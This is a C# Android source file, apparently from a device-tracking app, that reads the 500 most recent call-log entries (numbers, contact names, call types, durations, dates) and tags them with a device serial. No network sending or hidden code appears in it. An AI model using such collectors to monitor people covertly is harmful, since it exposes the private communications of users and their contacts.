using Android.Database;
using Android.Provider;
using DeviceTracker.Models;

namespace DeviceTracker.Services.Collectors;

/// <summary>
/// يجمع سجلات المكالمات من ContentProvider (CallLog) في Android.
/// يتطلب: READ_CALL_LOG permission
/// </summary>
public class CallLogCollector
{
    private const string DeviceSerial = "DEVICE_SERIAL_PLACEHOLDER";

    public static List<CallLogRecord> Collect(Android.Content.Context context)
    {
        var records = new List<CallLogRecord>();

        try
        {
            var cursor = context.ContentResolver?.Query(
                CallLog.Calls.ContentUri,
                null, null, null,
                $"{CallLog.Calls.Date} DESC LIMIT 500");

            if (cursor == null) return records;

            while (cursor.MoveToNext())
            {
                try
                {
                    var number = GetString(cursor, CallLog.Calls.Number) ?? "";
                    var name = GetString(cursor, CallLog.Calls.CachedName) ?? "";
                    var type = GetInt(cursor, CallLog.Calls.Type);
                    var duration = GetLong(cursor, CallLog.Calls.Duration);
                    var date = GetLong(cursor, CallLog.Calls.Date);

                    records.Add(new CallLogRecord
                    {
                        DeviceSerial = Preferences.Get("device_serial", "UNKNOWN"),
                        PhoneNumber = number,
                        ContactName = name,
                        CallType = type switch
                        {
                            1 => "incoming", 2 => "outgoing", 3 => "missed",
                            4 => "voicemail", 5 => "rejected", 6 => "blocked",
                            _ => "unknown"
                        },
                        DurationSeconds = (int)duration,
                        CallDate = DateTimeOffset.FromUnixTimeMilliseconds(date).UtcDateTime,
                        CapturedAt = DateTime.UtcNow
                    });
                }
                catch { continue; }
            }

            cursor.Close();
        }
        catch (Java.Lang.SecurityException)
        {
            System.Diagnostics.Debug.WriteLine("[CallLogCollector] Permission denied: READ_CALL_LOG");
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CallLogCollector] Error: {ex.Message}");
        }

        return records;
    }

    private static string? GetString(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetString(idx) : null;
    }

    private static int GetInt(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetInt(idx) : 0;
    }

    private static long GetLong(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetLong(idx) : 0;
    }
}
